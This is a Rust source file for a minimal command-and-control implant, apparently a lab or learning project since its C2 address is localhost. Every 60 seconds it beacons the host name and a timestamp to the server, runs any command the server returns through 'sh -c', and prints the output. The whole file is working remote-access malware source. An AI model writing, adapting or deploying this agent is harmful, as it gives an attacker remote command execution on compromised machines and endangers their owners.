use reqwest::Client;
use serde::Serialize;
use std::{thread, time::Duration};
use sysinfo::System;

mod sysinfo_saver;

#[derive(Serialize)]
struct MinimalBeacon {
    timestamp: u64,
    host_name: String,
}

#[tokio::main]
async fn main() {
    sysinfo_saver::save_file();
    let c2_url = "http://localhost:80/beacon";
    let client = Client::new();
    let mut sys = System::new_all();

    loop {
        sys.refresh_all();

        let beacon = MinimalBeacon {
            timestamp: chrono::Utc::now().timestamp() as u64,
            host_name: System::host_name().unwrap_or_default(),
        };

        let res = client.post(c2_url).json(&beacon).send().await;
        println!("Beacon sent at {}", chrono::Utc::now());

        match res {
            Ok(response) => {
                if response.status().is_success() {
                    let command: serde_json::Value = response.json().await.unwrap();
                    if let Some(cmd) = command.get("command").and_then(|c| c.as_str()) {
                        if !cmd.is_empty() {
                            println!("Executing command: {}", cmd);

                            let output = std::process::Command::new("sh")
                                .arg("-c")
                                .arg(cmd)
                                .output()
                                .expect("failed to execute process");

                            if output.status.success() {
                                let output_str = String::from_utf8_lossy(&output.stdout);
                                println!("Command output: {}", output_str);
                            } else {
                                let error_str = String::from_utf8_lossy(&output.stderr);
                                println!("Command failed with error: {}", error_str);
                            }
                        }
                    }
                } else {
                    println!("Error response from server : {}", response.status());
                }
            }
            Err(e) => {
                println!("Error response from server: {}", e);
            }
        }

        thread::sleep(Duration::from_secs(60)); // 60 seconds interval
    }
}
